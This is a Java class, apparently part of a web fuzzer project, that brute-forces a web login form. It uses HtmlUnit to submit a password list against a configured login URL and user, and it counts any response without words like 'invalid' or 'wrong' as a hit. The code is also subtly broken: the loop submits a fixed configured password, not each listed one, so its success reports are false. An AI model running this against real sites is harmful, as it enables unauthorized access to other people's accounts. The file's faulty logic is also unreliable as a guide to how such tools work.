package com.fuzzer.exploits;

import java.io.IOException;
import java.net.MalformedURLException;
import java.util.List;

import com.fuzzer.config.Config;
import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;

public class PasswordExploit {
	
	private static List<String> PASSWORDS = Config.getPasswordList();
	
	public static void crack(WebClient wc) {
		if (Config.LOGIN_URL == null) {
			return;
		}
		System.out.println("Logging Into Site...");
		HtmlPage page = null;
		try {
			page = wc.getPage(Config.LOGIN_URL);
		} catch (FailingHttpStatusCodeException e) {
			e.printStackTrace();
		} catch (MalformedURLException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		} catch (NullPointerException e){
			e.printStackTrace();
		}
		for (HtmlForm form : page.getForms()) {
			if (Config.LOGIN_USER_FIELD != null) {
				try {
					final HtmlTextInput userField;
					userField = form.getInputByName(Config.LOGIN_USER_FIELD);
					userField.setValueAttribute(Config.LOGIN_USER);
				} catch (Exception e) {
					continue;
				}
			}
			
			final HtmlTextInput passField;
			try {
				passField = form.getInputByName(Config.LOGIN_PASS_FIELD);
			} catch (Exception e) {
				continue;
			}

			try {
				HtmlSubmitInput submit = (HtmlSubmitInput) form.getFirstByXPath("//input[@type='submit']");
				for (String password : PASSWORDS) {
					passField.setValueAttribute(Config.LOGIN_PASS);
					HtmlPage responsePage = submit.<HtmlPage> click();
					String content = responsePage.getWebResponse().getContentAsString();
					if (!content.contains("invalid") && !content.contains("incorrect") && !content.contains("wrong")) {
						System.out.println("Password Found For " + Config.LOGIN_USER + ": " + password);
					}
					
					try {
						Thread.sleep(Config.TIME_GAP_MS);
					} catch (InterruptedException e) {
					}
				}
			} catch (IOException e) {
				// Wrong Password
			}
		}
	}
}
